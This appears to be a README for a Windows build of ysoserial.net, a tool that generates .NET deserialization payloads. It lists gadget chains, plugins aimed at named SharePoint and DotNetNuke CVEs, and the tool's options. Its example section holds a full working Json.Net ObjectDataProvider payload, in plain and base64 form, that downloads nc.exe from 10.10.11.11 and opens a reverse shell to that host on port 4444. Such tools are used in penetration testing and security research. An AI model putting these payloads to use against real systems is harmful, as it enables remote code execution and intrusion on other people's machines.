# ysoserial.net
ysoserial.net for Windows execute file

## Usage

ysoserial.exe -h  
ysoserial.net generates deserialization payloads for a variety of .NET formatters.  

Available gadgets:  
        ActivitySurrogateDisableTypeCheck (Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored.)  
                Formatters:  
                        BinaryFormatter, LosFormatter, NetDataContractSerializer, ObjectStateFormatter, SoapFormatter  
        ActivitySurrogateSelector (This gadget ignores the command parameter and executes the constructor of ExploitClass class.)  
                Formatters:  
                        BinaryFormatter, LosFormatter, ObjectStateFormatter, SoapFormatter  
        ActivitySurrogateSelectorFromFile (Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'.)  
                Formatters:  
                        BinaryFormatter, LosFormatter, ObjectStateFormatter, SoapFormatter  
        ObjectDataProvider (ObjectDataProvider gadget)  
                Formatters:  
                        DataContractSerializer, FastJson, FsPickler, JavaScriptSerializer, Json.Net, Xaml, XmlSerializer, YamlDotNet < 5.0.0  
        PSObject (PSObject gadget. Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017))  
                Formatters:  
                        BinaryFormatter, LosFormatter, NetDataContractSerializer, ObjectStateFormatter, SoapFormatter  
        SessionSecurityToken (SessionSecurityTokenGenerator gadget)  
                Formatters:  
                        BinaryFormatter, DataContractSerializer, Json.Net, LosFormatter, NetDataContractSerializer, ObjectStateFormatter, SoapFormatter
        TextFormattingRunProperties (TextFormattingRunProperties gadget)  
                Formatters:  
                        BinaryFormatter, LosFormatter, NetDataContractSerializer, ObjectStateFormatter, SoapFormatter  
        TypeConfuseDelegate (TypeConfuseDelegate gadget)  
                Formatters:  
                        BinaryFormatter, LosFormatter, NetDataContractSerializer, ObjectStateFormatter  
        TypeConfuseDelegateMono (TypeConfuseDelegate gadget - Tweaked to work with Mono)  
                Formatters:  
                        BinaryFormatter, LosFormatter, NetDataContractSerializer, ObjectStateFormatter  
        WindowsClaimsIdentity (WindowsClaimsIdentity (Microsoft.IdentityModel.Claims namespace) gadget)  
                Formatters:  
                        BinaryFormatter, DataContractSerializer, Json.Net, NetDataContractSerializer, SoapFormatter  
        WindowsIdentity (WindowsIdentity gadget)  
                Formatters:  
                        BinaryFormatter, DataContractSerializer, Json.Net, NetDataContractSerializer, SoapFormatter

Available plugins:  
        ActivatorUrl (Sends a generated payload to an activated, presumably remote, object)  
        Altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)  
        ApplicationTrust (Generates XML payload for the ApplicationTrust class)  
        Clipboard (Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps)  
        DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)  
        Resx (Generates RESX files)  
        SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)  
        SharePoint (Generates poayloads for the following SharePoint CVEs: CVE-2019-0604, CVE-2018-8421)  
        TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)  
        ViewState (Generates a ViewState using known MachineKey parameters)  

Usage: ysoserial.exe [options]  
Options:  
  -p, --plugin=VALUE         The plugin to be used.  
  -o, --output=VALUE         The output format (raw|base64). Default: raw  
  -g, --gadget=VALUE         The gadget chain.  
  -f, --formatter=VALUE      The formatter.  
  -c, --command=VALUE        The command to be executed.  
      --rawcmd               Command will be executed as is without `cmd /c `
                               being appended (anything after first space is an
                               argument).  
  -s, --stdin                The command to be executed will be read from
                               standard input.  
  -t, --test                 Whether to run payload locally. Default: false  
      --minify               Whether to minify the payloads where applicable
                               (experimental). Default: false  
      --sf, --searchformatter=VALUE
                             Search in all formatters to show relevant
                               gadgets and their formatters (other parameters
                               will be ignored).  
  -h, --help                 Shows this message and exit.  
      --credit               Shows the credit/history of gadgets and plugins
                               (other parameters will be ignored).  
## Example

ysoserial.exe -g ObjectDataProvider -f Json.Net -c "curl http://10.10.11.11/nc.exe -o nc.exe & nc.exe 10.10.11.11 4444 -e cmd.exe"  

{
    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "MethodParameters":{
        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values":["cmd", "/c curl http://10.10.11.11/nc.exe -o nc.exe & nc.exe 10.10.11.11 4444 -e cmd.exe"]
    },
    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
}

ysoserial.exe -g ObjectDataProvider -f Json.Net -c "curl http://10.10.11.11/nc.exe -o nc.exe & nc.exe 10.10.11.11 4444 -e cmd.exe" -o base64  

ewogICAgIiR0eXBlIjoiU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUiLCAKICAgICJNZXRob2ROYW1lIjoiU3RhcnQiLAogICAgIk1ldGhvZFBhcmFtZXRlcnMiOnsKICAgICAgICAiJHR5cGUiOiJTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkiLAogICAgICAgICIkdmFsdWVzIjpbImNtZCIsICIvYyBjdXJsIGh0dHA6Ly8xMC4xMC4xMS4xMS9uYy5leGUgLW8gbmMuZXhlICYgbmMuZXhlIDEwLjEwLjExLjExIDQ0NDQgLWUgY21kLmV4ZSJdCiAgICB9LAogICAgIk9iamVjdEluc3RhbmNlIjp7IiR0eXBlIjoiU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkifQp9

